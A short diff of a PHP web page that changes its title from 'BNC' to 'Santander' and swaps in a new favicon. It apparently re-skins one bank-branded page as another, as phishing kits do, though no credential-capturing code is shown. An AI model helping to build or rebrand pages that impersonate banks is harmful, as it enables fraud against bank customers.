@@ -47,8 +47,8 @@ if (isset($_GET['check'])) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="shortcut icon" href="iconero.ico">
-<title>BNC</title>
+<link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
+<title>Santander</title>
 
 <style>
 * { box-sizing: border-box; }
